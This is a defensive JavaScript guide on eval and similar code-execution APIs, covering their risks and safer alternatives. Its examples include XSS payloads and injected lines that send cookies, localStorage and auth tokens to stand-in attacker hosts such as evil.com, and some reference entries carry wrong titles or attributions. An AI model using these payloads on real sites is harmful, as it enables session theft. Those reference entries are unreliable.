# Eval and Dynamic Code Execution

## Definition

Dynamic code execution vulnerabilities occur when an application passes untrusted or partially untrusted data to functions that can execute arbitrary JavaScript code. The most dangerous function is `eval()`, but many other APIs share this risk including `setTimeout()`, `setInterval()`, the `Function` constructor, `document.write()`, and others.

An attacker exploits these functions by injecting malicious JavaScript code into data that the application later executes. Because the injected code runs with full privileges of the application, it can read sensitive data, modify the DOM, steal cookies, perform unauthorized actions, or launch further attacks.

---

## The Problem: Code vs. Data

JavaScript evolved with flexibility in mind, allowing strings to be treated as code. This flexibility is dangerous because it's difficult to safely sanitize code strings — anything can be valid JavaScript.

```javascript
// The fundamental problem:
const userInput = "alert('XSS')"; // User data

// This treats the string as CODE, not data:
eval(userInput); // ❌ DANGEROUS: Executes the alert

// This treats the string as data:
console.log(userInput); // ✓ SAFE: Prints the literal string
```

---

## All Eval-Equivalent APIs

### 1. eval()

The most dangerous function. Executes any JavaScript string with full access to the current scope.

```javascript
// DANGEROUS: Direct code execution
const userFormula = "2 + 2"; // Seems harmless
eval(userFormula); // Returns 4

// DANGEROUS: Can access and modify local variables
const secretKey = "secret123";
const malicious = "secretKey = 'stolen'";
eval(malicious);
console.log(secretKey); // 'stolen' - compromised!

// DANGEROUS: Can execute any JavaScript
const code = "fetch('https://evil.com/steal?data=' + document.cookie)";
eval(code); // Sends cookies to attacker!
```

### 2. setTimeout() and setInterval() with String

Passing a string to setTimeout/setInterval treats it as code.

```javascript
// DANGEROUS: String argument is executed
const delay = 1000;
const callback = "alert('Time passed')"; // String, not function

setTimeout(callback, delay);  // ❌ Executes the string as code
setInterval(callback, delay); // ❌ Executes the string as code

// DANGEROUS: With user input
const userAction = getUserInput();
setTimeout(userAction, 1000); // User could provide malicious code
```

### 3. Function Constructor

Creating functions from strings is essentially eval in disguise.

```javascript
// DANGEROUS: Code as string
const codeString = "return 2 + 2";
const addFunction = new Function(codeString);
console.log(addFunction()); // 4

// DANGEROUS: With parameters
const userFormula = getUserInput();
const calculate = new Function('x', 'y', userFormula); // Could be malicious
const result = calculate(5, 3); // Executes attacker's code

// DANGEROUS: Can access global scope
const stealData = new Function(
  "fetch('https://evil.com/steal?data=' + window.localStorage.getItem('token'))"
);
stealData(); // Steals token!
```

### 4. document.write()

Writing HTML with inline scripts can execute code.

```javascript
// DANGEROUS: HTML with scripts
const userContent = getUserInput(); // Attacker provides HTML
document.write(`<div>${userContent}</div>`);

// If userContent contains: <script>alert('XSS')</script>
// Or: <img src=x onerror="stealData()">
// The script executes!
```

### 5. innerHTML with Script Tags

Similar to document.write, but only executes in specific cases.

```javascript
// SOMEWHAT DANGEROUS: Script tags in innerHTML don't execute automatically
const userContent = getUserInput();
document.body.innerHTML = `<div>${userContent}</div>`;

// Script tags themselves don't execute with innerHTML
// But other approaches do:
document.body.innerHTML = '<img src=x onerror="alert(\'XSS\')">';
// This DOES execute!

// Or using SVG:
document.body.innerHTML = '<svg onload="alert(\'XSS\')">';
// This DOES execute!
```

### 6. Element.innerHTML with Dangerous Content

```javascript
// DANGEROUS: Event handlers and other attack vectors
const userHTML = '<img src=x onerror="stealCookie()">';
element.innerHTML = userHTML; // ❌ onerror executes!

const userHTML2 = '<svg><script>alert("XSS")</script></svg>';
element.innerHTML = userHTML2; // ❌ Script executes in some contexts!
```

### 7. importScript() and Dynamic Imports (in Workers)

```javascript
// DANGEROUS: Loading scripts from user-provided URLs
const scriptUrl = getUserInput();
importScripts(scriptUrl); // In Web Workers
// If URL points to attacker's server, their code runs!

// Also dangerous in main thread:
const scriptUrl = getUserInput();
const script = document.createElement('script');
script.src = scriptUrl;
document.head.appendChild(script); // Loads attacker's script
```

### 8. eval-like Methods in Libraries

Some libraries provide eval-like functionality:

```javascript
// Lodash _.mixin and _.template (older versions) could execute code
// Angular 1.x ng-bind-html without sanitization
// jQuery .html() with event handlers
// Various WYSIWYG editors that allow arbitrary HTML

// Always check library documentation for security implications
```

---

## Real Vulnerable Code Examples

### Example 1: Calculator Application

```javascript
// VULNERABLE: Calculator that evals user input
function simpleCalculator() {
  const userInput = document.getElementById('expression').value;

  // User enters: "2 + 2"
  // Seems safe, but what if they enter:
  // "2 + 2; fetch('https://evil.com/steal?cookie=' + document.cookie)"

  const result = eval(userInput); // ❌ DANGEROUS
  document.getElementById('result').textContent = result;
}

// HTML
/*
<input id="expression" placeholder="Enter math expression">
<button onclick="simpleCalculator()">Calculate</button>
<div id="result"></div>
*/

// Attacker enters:
// 2 + 2; fetch('https://evil.com/steal?auth=' + localStorage.getItem('authToken'))
// Calculator shows "4" but also steals auth token!
```

### Example 2: Dynamic Event Handler

```javascript
// VULNERABLE: Setting event handlers from strings
function attachEventHandler(element, eventName, handler) {
  // handler could come from user input
  element['on' + eventName] = handler; // ❌ If handler is a string, won't execute

  // Or using setAttribute:
  element.setAttribute(`on${eventName}`, handler);
  // This doesn't execute either

  // But these DO execute:
  setTimeout(handler, 0);     // ❌ If handler is a string
  element.innerHTML = `<img onerror="${handler}">`;  // ❌ Handler executes

  // Or:
  new Function(handler)();    // ❌ Executes the handler as code
}

// If attacker provides:
// handler = "fetch('https://evil.com/log')"
// The handler code executes!
```

### Example 3: Configuration Processing

```javascript
// VULNERABLE: Processing config with eval
function loadConfig(configString) {
  // Config might come from API, database, or user input
  const config = eval('(' + configString + ')'); // ❌ EXTREMELY DANGEROUS

  // If configString is a valid JSON like:
  // '{"apiUrl": "https://api.example.com"}'
  // It seems safe, but it's code, not data!

  // Attacker could provide:
  // '{"apiUrl": "evil.com", "onLoad": function() { stealData(); }}'
  // Or even:
  // '(function() { fetch("https://evil.com/steal?token=" + authToken); })()'

  return config;
}

// Usage
const configJSON = fetchConfigFromServer();
const config = loadConfig(configJSON); // If server is compromised, code executes
```

### Example 4: Template Processing with eval

```javascript
// VULNERABLE: Using eval to process templates
function renderTemplate(template, data) {
  // template might contain expressions like ${expression}
  const code = `
    const output = \`${template}\`;
    return output;
  `;

  // Using Function constructor
  const renderer = new Function('data', code);
  return renderer(data); // ❌ Template expressions execute as code

  // If template contains: \${fetch(...)}
  // The fetch executes during rendering!
}

// Vulnerable usage
const userTemplate = getUserTemplate();
const rendered = renderTemplate(userTemplate, {});
// If userTemplate is malicious, code runs
```

### Example 5: setTimeout with User Input

```javascript
// VULNERABLE: Using setTimeout with string callback
function scheduleAction(actionName, delay) {
  // actionName comes from user/database
  // Seems like it just triggers an action name:

  const actionCode = actionName; // "sendEmail", "deleteUser", etc.
  setTimeout(actionCode, delay); // ❌ If it contains code, it executes!

  // Attacker provides:
  // actionName = "console.log('executed')"
  // Or: "fetch('https://evil.com/attack')"
  // The code in actionName executes!

  // Even if you try to map action names:
  const actions = {
    sendEmail: 'sendEmail();',
    deleteUser: 'deleteUser();'
  };
  // Then: setTimeout(actions[actionName], delay);
  // Still dangerous if actionName isn't properly validated!
}
```

---

## Impact and Attack Scenarios

### Scenario 1: Data Theft

```javascript
// Attacker injects code that steals sensitive data
const injected = `
  fetch('https://attacker.com/log', {
    method: 'POST',
    body: JSON.stringify({
      cookies: document.cookie,
      localStorage: localStorage,
      sessionData: JSON.parse(sessionStorage.getItem('userData'))
    })
  });
`;

eval(injected); // All data sent to attacker
```

### Scenario 2: Session Hijacking

```javascript
// Attacker injects code that steals session tokens
const injected = `
  const token = localStorage.getItem('authToken');
  new Image().src = 'https://attacker.com/steal?token=' + token;
`;

eval(injected); // Token exfiltrated
```

### Scenario 3: Malware Distribution

```javascript
// Attacker injects code that redirects to malware
const injected = `
  window.location.href = 'https://attacker.com/malware.exe';
`;

eval(injected); // User redirected to malware
```

### Scenario 4: Cryptomining

```javascript
// Attacker injects code that mines cryptocurrency using user's CPU
const injected = `
  (function() {
    // Coinhive or similar mining script
    const script = document.createElement('script');
    script.src = 'https://attacker.com/miner.js';
    document.head.appendChild(script);
  })();
`;

eval(injected); // User's CPU used for mining
```

### Scenario 5: Unauthorized Actions

```javascript
// Attacker injects code that performs actions as the user
const injected = `
  fetch('/api/transfer-money', {
    method: 'POST',
    body: JSON.stringify({
      to: 'attacker@bank.com',
      amount: 9999,
      currency: 'USD'
    })
  });
`;

eval(injected); // Money transferred without consent
```

---

## Secure Alternatives

### Alternative 1: JSON.parse Instead of eval()

```javascript
// VULNERABLE:
const config = eval('(' + jsonString + ')'); // ❌ Code execution risk

// SECURE:
const config = JSON.parse(jsonString); // ✓ Safe for JSON data

// JSON.parse only accepts JSON, not JavaScript code
// Trying to parse '{"func": function() {}}' throws an error
// The code/syntax is rejected as invalid JSON
```

**Example:**

```javascript
// VULNERABLE calculator
function vulnerableCalculator(expression) {
  return eval(expression);
}

// SECURE calculator using math parser
const math = require('mathjs');
function secureCalculator(expression) {
  try {
    return math.evaluate(expression); // Only evaluates math, not arbitrary code
  } catch (e) {
    throw new Error('Invalid expression');
  }
}

// vulnerableCalculator("2 + 2; fetch('...')") // Steals data!
// secureCalculator("2 + 2; fetch('...')") // Error: unexpected symbol }
```

### Alternative 2: Named Functions Instead of String Callbacks

```javascript
// VULNERABLE: String callbacks
setTimeout("handleTimeout()", 1000); // ❌ String execution

// SECURE: Function reference
setTimeout(handleTimeout, 1000); // ✓ Safe

// Define the function separately
function handleTimeout() {
  console.log('Timeout occurred');
}
```

**Example with arguments:**

```javascript
// VULNERABLE:
setTimeout("sendData(" + JSON.stringify(data) + ")", 1000); // ❌ String execution

// SECURE: Use closure
setTimeout(() => {
  sendData(data);
}, 1000); // ✓ Safe

// Or with bind:
setTimeout(sendData.bind(null, data), 1000); // ✓ Safe
```

### Alternative 3: Expression Parsers/Evaluators

For applications that need to evaluate user expressions (calculators, spreadsheets), use safe parsers:

```javascript
// Calculator application - SECURE
const math = require('mathjs');

function calculate(expression) {
  try {
    const result = math.evaluate(expression);
    return result;
  } catch (e) {
    throw new Error('Invalid expression: ' + e.message);
  }
}

// Safe: Only math operations allowed
console.log(calculate("2 + 2")); // 4
console.log(calculate("sqrt(16)")); // 4

// Blocks: Code execution
// calculate("fetch('https://evil.com')") // Error: Unknown function

// Other safe parsers:
// - expr-eval: https://github.com/silentmantra/expr-eval
// - jexl: https://github.com/TomFrost/jexl
// - esprima + custom evaluator: Parses JavaScript AST safely
```

### Alternative 4: DOMPurify for HTML (Not Script Execution)

```javascript
// VULNERABLE: Direct innerHTML with user input
document.body.innerHTML = userProvidedHTML; // ❌ Can execute scripts

// SECURE: Sanitize with DOMPurify
const DOMPurify = require('isomorphic-dompurify');
const clean = DOMPurify.sanitize(userProvidedHTML);
document.body.innerHTML = clean; // ✓ Safe, scripts removed
```

### Alternative 5: Whitelist/Mapping Pattern

```javascript
// VULNERABLE: eval or Function constructor with user input
const userAction = getUserInput();
new Function(userAction)(); // ❌ Code execution

// SECURE: Map user input to safe functions
const actionHandlers = {
  'sendEmail': sendEmail,
  'deleteItem': deleteItem,
  'updateProfile': updateProfile
  // ... only safe functions in the map
};

function executeAction(actionName, params) {
  const handler = actionHandlers[actionName];

  if (!handler) {
    throw new Error('Unknown action: ' + actionName);
  }

  // Call the function, not eval
  return handler(params);
}

// Usage
executeAction('sendEmail', { to: 'user@example.com' }); // ✓ Safe

// Attacker tries:
// executeAction('eval', ['fetch("https://evil.com")'])
// Error: Unknown action - eval is not in the whitelist!
```

### Alternative 6: Template Engines with Safe Compilation

```javascript
// VULNERABLE: eval with templates
const template = getUserTemplate();
const output = eval(`\`${template}\``); // ❌ Code execution

// SECURE: Use a safe template engine
const Handlebars = require('handlebars');

const templateString = getUserTemplate();
const template = Handlebars.compile(templateString);
const output = template(data);

// Handlebars doesn't allow arbitrary code execution
// User can use: {{variable}}, {{#if}}, {{#each}}, etc.
// But not: {{fetch('...')}}, {{require('fs')}}, etc.

// Other safe template engines:
// - Mustache: Simple, safe
// - Nunjucks: With CSP/sandbox mode
// - Pug: With safe options
```

### Alternative 7: Expression Language with Limited Power

```javascript
// For simple expressions, use a minimal language:

// VULNERABLE:
eval(userExpression); // ❌ Code execution

// SECURE: Use jexl (JavaScript Expression Language)
const jexl = require('jexl');

jexl.eval('price * quantity', {
  price: 10,
  quantity: 5
}).then(result => {
  console.log(result); // 50
});

// Blocks: Dangerous operations
// jexl.eval('import("fs").readFile(...)') -> Error
// jexl.eval('fetch("https://evil.com")') -> Error
// jexl.eval('process.exit()') -> Error
```

---

## Linting and Static Analysis

### ESLint Rules

```javascript
// .eslintrc.json
{
  "rules": {
    "no-eval": "error",
    "no-implied-eval": "error",
    "no-new-func": "error",
    "no-script-url": "error"
  }
}
```

### Rule Descriptions

- **no-eval**: Forbids `eval()` completely
- **no-implied-eval**: Forbids eval-like usage with setTimeout, setInterval, etc.
- **no-new-func**: Forbids `new Function()` constructor
- **no-script-url**: Forbids `javascript:` URLs

### Configuration Example

```json
{
  "parserOptions": {
    "ecmaVersion": 2020,
    "sourceType": "module"
  },
  "rules": {
    "no-eval": "error",
    "no-implied-eval": "error",
    "no-new-func": "error",
    "no-script-url": "error",
    "no-extend-native": "error"
  }
}
```

---

## Best Practices Checklist

1. **Never Use eval()**
   - Always has a better alternative
   - No exceptions, ever

2. **Never Pass Strings to setTimeout/setInterval**
   ```javascript
   // ❌ WRONG
   setTimeout("doSomething()", 1000);

   // ✓ RIGHT
   setTimeout(doSomething, 1000);
   ```

3. **Never Use Function Constructor with Untrusted Input**
   ```javascript
   // ❌ WRONG
   new Function(userInput)();

   // ✓ RIGHT - Use whitelist pattern instead
   ```

4. **Sanitize HTML Before Using innerHTML**
   ```javascript
   // ✓ Use DOMPurify
   element.innerHTML = DOMPurify.sanitize(userHTML);
   ```

5. **Use JSON.parse for JSON Data**
   ```javascript
   // ✓ SAFE
   const config = JSON.parse(configString);

   // ❌ DANGEROUS
   const config = eval(configString);
   ```

6. **Use Safe Expression Evaluators**
   - For math: mathjs, expr-eval
   - For conditionals: jexl
   - For templates: Handlebars, Mustache

7. **Use Allowlist/Mapping Pattern**
   - Map user input to safe functions
   - Never execute user input as code

8. **Enable ESLint Rules**
   - no-eval
   - no-implied-eval
   - no-new-func
   - no-script-url

9. **Code Review**
   - Review any code that might execute user input
   - Look for indirect eval usage
   - Check template processing

10. **Content Security Policy**
    - Disable inline scripts
    - Use nonces for necessary inline scripts
    - Restrict script sources

```http
Content-Security-Policy:
  default-src 'self';
  script-src 'self';
  object-src 'none';
```

---

## Detecting the Vulnerability

### Code Review Checklist

Search your codebase for these patterns:

```javascript
// DANGEROUS PATTERNS:
eval(
new Function(
setTimeout(..., string)
setInterval(..., string)
element.innerHTML = userInput
element.innerHTML = userInput (with <img onerror> or <svg onload>)
innerHTML = "..." + userInput
document.write(..., userInput)
innerHTML = ` ${userInput}` (with event handlers)
[...element.innerHTML](...) (indirect execution)
Function(userInput)
```

---

## Real-World Examples

- **jQuery: Cross-Site Scripting via jQuery.html()** (CVE-2011-1487)
- **Underscore.js template vulnerability** (Fixed in later versions)
- **Angular 1.x ng-bind-html without sanitization**
- **Various WYSIWYG editors** (CKEditor, TinyMCE) vulnerable to XSS if misconfigured

---

## Related Reading

- OWASP: Code Injection
- CWE-95: Improper Neutralization of Directives in Dynamically Evaluated Code
- CWE-96: Improper Control of Interaction Frequency
- MDN: eval() is Evil
- The Security Implications of eval()
- ESLint Rules for Code Execution Safety
